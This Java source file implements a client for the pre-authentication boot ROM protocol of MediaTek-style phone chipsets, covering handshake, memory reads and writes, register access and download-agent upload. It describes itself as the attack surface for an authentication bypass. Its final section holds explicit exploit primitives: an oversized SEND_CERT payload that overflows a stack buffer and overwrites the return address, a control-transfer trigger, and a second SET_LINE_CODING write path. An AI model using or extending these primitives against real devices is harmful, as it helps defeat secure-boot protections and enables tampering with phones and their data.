package com.rizky.mtkflash.auth;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

/**
 * Command client for the pre-authentication command set.
 *
 * Framing rules, taken from what the device actually answers:
 *
 * <ul>
 *   <li>every byte written is echoed back; a command that is not echoed means
 *       the stream is desynced and we stop instead of sending the body</li>
 *   <li>4-byte status words are big endian</li>
 *   <li>4-byte data words are little endian (they are raw memory bytes)</li>
 * </ul>
 *
 * Only commands reachable before authentication are wrapped: that is the
 * surface the bypass works on.
 */
public class BromClient {

    /** START command: puts the device from handshake state into command state. */
    public static final byte CMD_START = (byte) 0xA0;
    public static final byte CMD_GET_VERSION = (byte) 0xFF;
    public static final byte CMD_GET_HW_CODE = (byte) 0xFD;
    public static final byte CMD_GET_BL_VER = (byte) 0xFE;
    public static final byte CMD_GET_TARGET_CONFIG = (byte) 0xD8;
    public static final byte CMD_READ16 = (byte) 0xD0;
    public static final byte CMD_READ32 = (byte) 0xD1;
    public static final byte CMD_WRITE16 = (byte) 0xD2;
    public static final byte CMD_WRITE32 = (byte) 0xD4;
    public static final byte CMD_JUMP_DA = (byte) 0xD5;
    public static final byte CMD_SEND_DA = (byte) 0xD7;
    public static final byte CMD_BROM_REGISTER_ACCESS = (byte) 0xDA;
    public static final byte CMD_SEND_CERT = (byte) 0xE0;

    /** SLA/DAA challenge required: a signed image is demanded. */
    public static final int STATUS_AUTH_REQUIRED = 0x1D0D;
    /** No authentication needed on this part. */
    public static final int STATUS_NO_AUTH = 0x1D0C;
    /** Signature verification failed. */
    public static final int STATUS_BAD_SIGNATURE = 0x1D0E;

    private final BromLink link;

    private int hwCode = -1;
    private int hwSubCode = -1;
    private int bromVersion = -1;
    private int blVersion = -1;
    private int targetConfig = -1;

    public BromClient(BromLink link) {
        this.link = link;
    }

    public BromLink link() {
        return link;
    }

    // ------------------------------------------------------------------
    // framing
    // ------------------------------------------------------------------

    /** Write {@code data} and require the device to echo it back. */
    public boolean echo(byte[] data) throws IOException {
        // The echo can be late on a real part and the emulator only releases it
        // once it has seen the byte twice, so retry the write like the
        // reference client does instead of giving up on the first timeout.
        for (int attempt = 0; attempt < 3; attempt++) {
            link.write(data);
            byte[] got;
            try {
                got = link.read(data.length, 2000);
            } catch (IOException e) {
                continue;
            }
            if (got.length != data.length) {
                continue;
            }
            boolean same = true;
            for (int i = 0; i < data.length; i++) {
                if (got[i] != data[i]) {
                    same = false;
                    break;
                }
            }
            if (same) {
                return true;
            }
        }
        return false;
    }

    public boolean echo(byte value) throws IOException {
        return echo(new byte[]{value});
    }

    public boolean echo32(int value) throws IOException {
        return echo(be32(value));
    }

    /** 4-byte status word, big endian. */
    public int rword() throws IOException {
        return intFrom(link.read(4), ByteOrder.BIG_ENDIAN);
    }

    /** 4-byte data word, little endian (real memory value). */
    public int rdword() throws IOException {
        return intFrom(link.read(4), ByteOrder.LITTLE_ENDIAN);
    }

    public static byte[] be32(int v) {
        return new byte[]{(byte) (v >>> 24), (byte) (v >>> 16), (byte) (v >>> 8), (byte) v};
    }

    public static byte[] le32(int v) {
        return new byte[]{(byte) v, (byte) (v >>> 8), (byte) (v >>> 16), (byte) (v >>> 24)};
    }

    /** Unsigned 16-bit status word; the protocol answers trailing status with 2 bytes. */
    public static int shortFrom(byte[] b, ByteOrder order) {
        return ByteBuffer.wrap(b).order(order).getShort() & 0xFFFF;
    }

    public static int intFrom(byte[] b, ByteOrder order) {
        return ByteBuffer.wrap(b).order(order).getInt();
    }

    public static int le32At(byte[] b, int off) {
        return ByteBuffer.wrap(b, off, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
    }

    /** Byte-swap a 32-bit value. */
    public static int revdword(int v) {
        return ((v & 0xFF) << 24) | ((v & 0xFF00) << 8) | ((v >>> 8) & 0xFF00) | ((v >>> 24) & 0xFF);
    }

    // ------------------------------------------------------------------
    // identification
    // ------------------------------------------------------------------

    /**
     * Send START (A0 0A 50 05) and check the per-byte inverted echo. A device
     * that is still in handshake state only answers once it has seen this
     * sequence, so every run against a freshly plugged phone starts here.
     *
     * @return true when the device answered the whole sequence
     */
    public boolean start(int attempts) throws IOException {
        final byte[] start = {(byte) 0xA0, (byte) 0x0A, (byte) 0x50, (byte) 0x05};
        for (int i = 0; i < Math.max(1, attempts); i++) {
            boolean ok = true;
            for (byte b : start) {
                link.drain();
                link.write(new byte[]{b});
                byte[] echo;
                try {
                    echo = link.read(1, 1000);
                } catch (IOException e) {
                    ok = false;
                    break;
                }
                if (echo.length != 1 || echo[0] != (byte) ((~b) & 0xFF)) {
                    ok = false;
                    break;
                }
            }
            if (ok) {
                return true;
            }
        }
        return false;
    }

    public int getVersion() throws IOException {
        if (!echo(CMD_GET_VERSION)) {
            throw new IOException("GET_VERSION tidak di-echo");
        }
        bromVersion = link.read(1)[0] & 0xFF;
        return bromVersion;
    }

    public int getHwCode() throws IOException {
        if (!echo(CMD_GET_HW_CODE)) {
            throw new IOException("GET_HW_CODE tidak di-echo");
        }
        byte[] r = link.read(4);
        hwCode = ((r[0] & 0xFF) << 8) | (r[1] & 0xFF);
        hwSubCode = ((r[2] & 0xFF) << 8) | (r[3] & 0xFF);
        return hwCode;
    }

    public int getBlVersion() throws IOException {
        if (!echo(CMD_GET_BL_VER)) {
            throw new IOException("GET_BL_VER tidak di-echo");
        }
        blVersion = link.read(1)[0] & 0xFF;
        return blVersion;
    }

    public int hwCode() {
        return hwCode;
    }

    public int hwSubCode() {
        return hwSubCode;
    }

    public int targetConfig() {
        return targetConfig;
    }

    /**
     * Pre-auth target config: bit 0x2 SLA, 0x4 DAA, 0x10 cert, 0x20 memread
     * needs auth, 0x40 memwrite needs auth.
     */
    public int getTargetConfig() throws IOException {
        if (!echo(CMD_GET_TARGET_CONFIG)) {
            throw new IOException("GET_TARGET_CONFIG tidak didukung chip ini");
        }
        byte[] r = link.read(6);
        if (r.length != 6) {
            throw new IOException("balasan GET_TARGET_CONFIG pendek: " + r.length + " byte");
        }
        int cfg = intFrom(new byte[]{r[0], r[1], r[2], r[3]}, ByteOrder.BIG_ENDIAN);
        int status = ((r[4] & 0xFF) << 8) | (r[5] & 0xFF);
        if (status > 0xFF) {
            throw new IOException(String.format("GET_TARGET_CONFIG gagal, status %04X", status));
        }
        targetConfig = cfg;
        return cfg;
    }

    public static String describeTargetConfig(int cfg) {
        StringBuilder sb = new StringBuilder();
        if ((cfg & 0x1) != 0) sb.append("SBC ");
        if ((cfg & 0x2) != 0) sb.append("SLA ");
        if ((cfg & 0x4) != 0) sb.append("DAA ");
        if ((cfg & 0x8) != 0) sb.append("EPP ");
        if ((cfg & 0x10) != 0) sb.append("CERT ");
        if ((cfg & 0x20) != 0) sb.append("MEMREAD_AUTH ");
        if ((cfg & 0x40) != 0) sb.append("MEMWRITE_AUTH ");
        return sb.length() == 0 ? "none" : sb.toString().trim();
    }

    // ------------------------------------------------------------------
    // memory access
    // ------------------------------------------------------------------

    public int read32(int addr) throws IOException {
        if (!echo(CMD_READ32)) {
            throw new IOException("READ32 tidak di-echo");
        }
        if (!echo32(addr)) {
            throw new IOException(String.format("READ32 alamat 0x%08X tidak di-echo", addr));
        }
        boolean ack = echo32(1);
        int status = rword();
        if (status > 0xFF) {
            throw new IOException(String.format("READ32 0x%08X ditolak, status %04X", addr, status));
        }
        if (!ack) {
            throw new IOException(String.format("READ32 0x%08X tidak di-ACK", addr));
        }
        int value = rdword();
        int status2 = shortFrom(link.read(2), ByteOrder.BIG_ENDIAN);
        if (status2 > 0xFF) {
            throw new IOException(String.format("READ32 0x%08X status akhir %04X", addr, status2));
        }
        return value;
    }

    public int[] read32(int addr, int count) throws IOException {
        if (!echo(CMD_READ32)) {
            throw new IOException("READ32 tidak di-echo");
        }
        if (!echo32(addr)) {
            throw new IOException(String.format("READ32 alamat 0x%08X tidak di-echo", addr));
        }
        boolean ack = echo32(count);
        int status = rword();
        if (status > 0xFF) {
            throw new IOException(String.format("READ32 0x%08X ditolak, status %04X", addr, status));
        }
        if (!ack) {
            throw new IOException(String.format("READ32 0x%08X tidak di-ACK", addr));
        }
        byte[] raw = link.read(count * 4);
        int[] out = new int[count];
        for (int i = 0; i < count; i++) {
            out[i] = le32At(raw, i * 4);
        }
        int status2 = shortFrom(link.read(2), ByteOrder.BIG_ENDIAN);
        if (status2 > 0xFF) {
            throw new IOException(String.format("READ32 0x%08X status akhir %04X", addr, status2));
        }
        return out;
    }

    public void write32(int addr, int... values) throws IOException {
        if (!echo(CMD_WRITE32)) {
            throw new IOException("WRITE32 tidak di-echo");
        }
        if (!echo32(addr)) {
            throw new IOException(String.format("WRITE32 alamat 0x%08X tidak di-echo", addr));
        }
        boolean ack = echo32(values.length);
        int status = rword();
        if (status > 0xFF) {
            throw new IOException(String.format("WRITE32 0x%08X ditolak, status %04X", addr, status));
        }
        if (!ack || status > 3) {
            throw new IOException(String.format("WRITE32 0x%08X tidak di-ACK, status %04X", addr, status));
        }
        for (int v : values) {
            if (!echo(be32(v))) {
                throw new IOException(String.format("WRITE32 nilai di 0x%08X tidak di-echo", addr));
            }
        }
        int status2 = rword();
        if (status2 > 0xFF) {
            throw new IOException(String.format("WRITE32 0x%08X status akhir %04X", addr, status2));
        }
    }

    public byte[] readMem(int addr, int length) throws IOException {
        byte[] out = new byte[length];
        int off = 0;
        while (off + 4 <= length) {
            int words = Math.min((length - off) / 4, 0x100);
            int[] vals = read32(addr + off, words);
            for (int i = 0; i < words; i++) {
                System.arraycopy(le32(vals[i]), 0, out, off + i * 4, 4);
            }
            off += words * 4;
        }
        if (off != length) {
            throw new IOException("readMem: panjang harus kelipatan 4 (" + length + ")");
        }
        return out;
    }

    public void writeMem(int addr, byte[] blob) throws IOException {
        int padded = (blob.length + 3) & ~3;
        byte[] buf = new byte[padded];
        System.arraycopy(blob, 0, buf, 0, blob.length);
        int words = padded / 4;
        for (int i = 0; i < words; i += 0x100) {
            int n = Math.min(0x100, words - i);
            int[] vals = new int[n];
            for (int j = 0; j < n; j++) {
                vals[j] = le32At(buf, (i + j) * 4);
            }
            write32(addr + i * 4, vals);
        }
    }

    // ------------------------------------------------------------------
    // register path (not subject to the RAM blacklist)
    // ------------------------------------------------------------------

    public byte[] registerAccess(int address, int length, byte[] data, boolean checkStatus)
            throws IOException {
        int mode = data == null ? 0 : 1;
        if (!echo(CMD_BROM_REGISTER_ACCESS)) {
            throw new IOException("BROM_REGISTER_ACCESS tidak di-echo");
        }
        echo32(mode);
        echo32(address);
        echo32(length);
        int status = shortFrom(link.read(2), ByteOrder.LITTLE_ENDIAN);
        if (status != 0) {
            throw new IOException(String.format(
                    "register access 0x%08X ditolak, status %04X", address, status));
        }
        byte[] result;
        if (data == null) {
            result = link.read(length);
        } else {
            link.write(data);
            result = new byte[0];
        }
        if (checkStatus) {
            int st = shortFrom(link.read(2), ByteOrder.LITTLE_ENDIAN);
            if (st != 0) {
                throw new IOException(String.format(
                        "register access 0x%08X status akhir %04X", address, st));
            }
        }
        return result;
    }

    // ------------------------------------------------------------------
    // DA download
    // ------------------------------------------------------------------

    public void sendDa(int address, byte[] da, int sigLen) throws IOException {
        if (!echo(CMD_SEND_DA)) {
            throw new IOException("SEND_DA tidak di-echo");
        }
        if (!echo32(address)) {
            throw new IOException("SEND_DA alamat tidak di-echo");
        }
        if (!echo32(da.length)) {
            throw new IOException("SEND_DA panjang tidak di-echo");
        }
        if (!echo32(sigLen)) {
            throw new IOException("SEND_DA sigLen tidak di-echo");
        }
        int status = rword();
        if (status == STATUS_AUTH_REQUIRED) {
            throw new AuthRequiredException(
                    "SEND_DA minta SLA/DAA: image harus bertanda tangan", status);
        }
        if (status > 0xFF) {
            throw new IOException(String.format("SEND_DA ditolak, status %04X", status));
        }
        int off = 0;
        while (off < da.length) {
            int n = Math.min(512, da.length - off);
            byte[] part = new byte[n];
            System.arraycopy(da, off, part, 0, n);
            link.write(part);
            off += n;
        }
        link.write(new byte[0]);
        int crc = rword();
        int st = rword();
        if (st > 0xFF) {
            throw new IOException(String.format("unggah DA ditolak, status %04X", st));
        }
        if ((crc & 0xFFFFFFFFL) != (sum32(da) & 0xFFFFFFFFL)) {
            throw new IOException(String.format(
                    "checksum DA tidak cocok: device %08X, host %08X", crc, sum32(da)));
        }
    }

    public static int sum32(byte[] data) {
        int sum = 0;
        for (byte b : data) {
            sum = (sum + (b & 0xFF)) & 0xFFFFFFFF;
        }
        return sum;
    }

    public void jumpDa(int addr) throws IOException {
        if (!echo(CMD_JUMP_DA)) {
            throw new IOException("JUMP_DA tidak di-echo");
        }
        link.write(be32(addr));
        int back = rdword();
        if (back != addr) {
            throw new IOException(String.format(
                    "JUMP_DA balas 0x%08X, harusnya 0x%08X", back, addr));
        }
        int status = rword();
        if (status != 0) {
            throw new IOException(String.format("JUMP_DA status %04X", status));
        }
    }

    // ------------------------------------------------------------------
    // the overflow primitive
    // ------------------------------------------------------------------

    /**
     * 0xE0. The handler copies the host supplied length into a fixed stack
     * buffer without bounding it against the frame size; a length larger than
     * the frame smashes the saved return address.
     */
    public void sendCert(byte[] payload) throws IOException {
        if (!echo(CMD_SEND_CERT)) {
            throw new IOException("SEND_CERT tidak di-echo");
        }
        if (!echo32(payload.length)) {
            throw new IOException("SEND_CERT panjang tidak di-echo");
        }
        int status = shortFrom(link.read(2), ByteOrder.LITTLE_ENDIAN);
        if (status != 0) {
            throw new IOException(String.format("SEND_CERT ditolak, status %04X", status));
        }
        link.write(payload);
        link.read(2);
        link.read(2);
    }

    /** The control transfer that pops the smashed frame. */
    public byte[] trigger(int var1) throws IOException {
        return link.control(0xA1, 0x00, 0x0000, var1, null, 0);
    }

    /** SET_LINE_CODING append, the second primitive's write path. */
    public byte[] lineCode(int request, byte[] data, int length) throws IOException {
        return link.control(0x21, request, 0x0000, 0x0000, data, length);
    }

    public byte[] lineCodeRead(int request, int length) throws IOException {
        return link.control(0xA1, request, 0x0000, 0x0000, null, length);
    }

    /** Thrown when the device demands a signed image, i.e. the gate is intact. */
    public static class AuthRequiredException extends IOException {
        public final int status;

        public AuthRequiredException(String msg, int status) {
            super(msg);
            this.status = status;
        }
    }
}
